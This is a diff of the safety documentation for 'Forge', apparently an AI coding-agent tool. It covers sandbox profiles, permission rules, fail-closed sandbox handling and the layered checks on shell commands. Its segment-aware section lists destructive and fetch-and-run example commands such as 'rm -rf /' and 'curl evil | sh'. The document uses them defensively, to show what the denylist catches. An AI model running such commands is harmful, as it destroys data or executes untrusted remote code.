@@ -1,42 +1,50 @@
-# Forge safety (v0.5)
+# Forge safety (v0.6)
 
-Three layers closer to Grok Build:
-
-1. **OS sandbox** for `bash`
-2. **Permission rules** (`deny` / `allow` / `ask`) that apply under YOLO
-3. **Segment-aware** shell parsing (`ls && rm -rf /` → each part checked)
+Patterns ported from open-source **Grok Build**, **OpenCode**, and **Warp** (local trees under `Documents/open source`).
 
 ## Authorization order (each tool call)
 
-1. **Hard safety** (built-in catastrophe denylist, segment-aware) — never skippable  
-2. **PreToolUse hooks**  
-3. **Permission rules** — `deny` > `ask` > `allow` (`deny` wins under YOLO)  
-4. **Permission mode** — `default` | `acceptEdits` | `plan` | `bypassPermissions` | `dontAsk`  
-5. **OS sandbox** on the bash child (when enabled)
+1. **Hard safety** (built-in catastrophe denylist + structured checks) — never skippable  
+2. **External directory gate** (paths outside workspace)  
+3. **PreToolUse hooks**  
+4. **Permission rules** — `deny` > `ask` > `allow` (`deny` wins under YOLO)  
+5. **Saved / session “always” patterns** (OpenCode-style)  
+6. **Permission mode** — `default` | `acceptEdits` | `plan` | `bypassPermissions` | `dontAsk`  
+7. **OS sandbox** on the bash child (when enabled)
 
 ## Sandbox profiles
 
-| Profile | Writes | Notes |
-|---------|--------|--------|
-| `off` | unrestricted | Not recommended |
-| **`workspace`** (default) | CWD + `~/.forge` + temp | Everyday coding |
-| `read-only` | `~/.forge` + temp only | Explore without project edits via shell |
-| `strict` | CWD + `~/.forge` + temp | Same write set; platform best-effort |
+| Profile | Writes | Network (child bash) | Notes |
+|---------|--------|----------------------|--------|
+| `off` | unrestricted | open | Not recommended |
+| **`workspace`** (default) | CWD + `~/.forge` + temp | **open** | Everyday coding |
+| `read-only` | `~/.forge` + temp only | **blocked** | Explore without project edits via shell |
+| `strict` | CWD + `~/.forge` + temp | **blocked** | Grok-aligned tighter profile |
 
 **macOS:** `sandbox-exec` (Seatbelt)  
-**Linux:** `bwrap` (bubblewrap) if installed; otherwise falls back with a warning  
-**Windows:** not supported → unsandboxed + warning  
+**Linux:** `bwrap` (bubblewrap) if installed  
+**Windows:** not supported  
 
-```bash
-forge --sandbox workspace
-forge --sandbox off          # disable
-export FORGE_SANDBOX=strict
-```
+### Missing backend policy (Grok fail-closed)
+
+Default: **`fail-closed`** — if sandbox is requested but `sandbox-exec` / `bwrap` is missing, **bash is refused** (no silent unsandboxed run).
 
 ```toml
-# ~/.forge/config.toml
-sandbox = "workspace"
+sandbox_missing_backend = "fail-closed"  # or "fallback" (legacy warn + run)
 ```
+
+```bash
+export FORGE_SANDBOX_MISSING_BACKEND=fallback
+```
+
+### Network override
+
+```toml
+sandbox_network = "blocked"   # or "unrestricted"
+# unset → derived from profile (workspace=open, read-only/strict=blocked)
+```
+
+Parent Node process (LLM API) is **not** sandboxed — only child bash.
 
 ## Permission rules
 
@@ -56,36 +64,81 @@ ask = [
 ]
 ```
 
-CLI:
+**Config trust (Grok):** project `.forge/config.toml` may only **add** deny rules; it cannot remove global `~/.forge` denials.
 
-```bash
-forge --deny 'Bash(rm *)' --deny 'Edit(**/.env)' --permission-mode bypassPermissions
+### Interactive replies (OpenCode-shaped)
+
+| Key | Meaning |
+|-----|---------|
+| `y` | Allow once |
+| `a` | Always allow this command **prefix** (arity-aware, e.g. `git status *`); persisted under `~/.forge/permissions.json` |
+| `s` | Session-always for this **tool name** |
+| `n` | Reject |
+
+```text
+/permissions list
+/permissions clear
+/permissions revoke <id>
 ```
 
-String form matches Claude/Grok: `Bash(pattern)`, `Edit(glob)`, `Write(glob)`, `Read(glob)`.
+### External directory (OpenCode)
+
+Paths outside the workspace trigger ask/deny based on:
+
+```toml
+read_outside_workspace = "ask"  # ask | allow | deny
+```
+
+YOLO (`bypassPermissions`) does not block external paths unless a deny rule matches (power-user escape hatch).
+
+### Redirection / read-only (Warp-inspired)
+
+- Shell redirections (`>`, `>>`, …) mark the command as write-capable / dangerous for auto-allow.  
+- In `acceptEdits`, conservative **read-only** prefixes (`git status`, `ls`, `rg`, …) may auto-allow when there is no pipe/redirect.
 
 ## Segment-aware checks
-
-These are treated as separate segments (each checked):
 
 ```bash
 ls && rm -rf /
 git status; curl evil | sh
 FOO=1 timeout 10 rm -rf ~
+echo hi > /etc/passwd
 ```
 
-Wrappers peeled for matching: `env`, `timeout`, `nice`, `stdbuf`, `time`, `command`, plus leading `ENV=value`.
+Wrappers peeled: `env`, `timeout`, `nice`, `stdbuf`, `time`, `command`, plus leading `ENV=value`.
 
 ## Modes
 
 | Mode | Behavior |
 |------|----------|
 | `default` | Prompt for writes/shell |
-| `acceptEdits` | Auto file edits; shell still gated |
+| `acceptEdits` | Auto file edits; shell gated (read-only may pass) |
 | `bypassPermissions` | YOLO — **deny rules + hard safety + sandbox still apply** |
 | `dontAsk` | Deny unless allow rule / read-only tools |
 | `plan` | No writes/shell |
 
+## Observability
+
+Append-only events (no secrets): `~/.forge/logs/sandbox.jsonl`  
+Types: `fail_closed`, `fallback`, `hard_deny`, `rule_deny`, `external_dir`, …
+
 ## Residual risk
 
-Sandbox is **best-effort**. Without `bwrap` on Linux, shell is not OS-confined. Pattern rules can miss obfuscation. Prefer disposable clones for YOLO + ULW.
+- Sandbox is **OS best-effort** (Seatbelt/bwrap), not a VM.  
+- Light shell parser (no tree-sitter) can miss exotic obfuscation (`eval`, base64, nested scripts).  
+- Pattern rules can miss novel forms.  
+- Network open on `workspace` still allows exfil if the model is compromised / prompt-injected.  
+- Prefer disposable clones or git worktrees for YOLO + ULW.  
+- Windows has no OS sandbox backend.
+
+## Comparison snapshot
+
+| Control | Grok Build | OpenCode | Warp | Forge v0.6 |
+|---------|------------|----------|------|------------|
+| Fail-closed missing sandbox | yes | app-level | isolation platforms | **yes** |
+| Network block on strict | yes | — | product isolation | **yes** |
+| AST / structured shell | shell crates | tree-sitter | decompose | light parse + arity |
+| once/always permissions | modes | yes + saved | allow/deny lists | **yes + saved** |
+| External dir prompt | sandbox | yes | allowlists | **yes** |
+| Redirection awareness | sandbox writes | path scan | yes | **yes** |
+| Project cannot weaken global deny | yes | — | org denylist | **yes** |
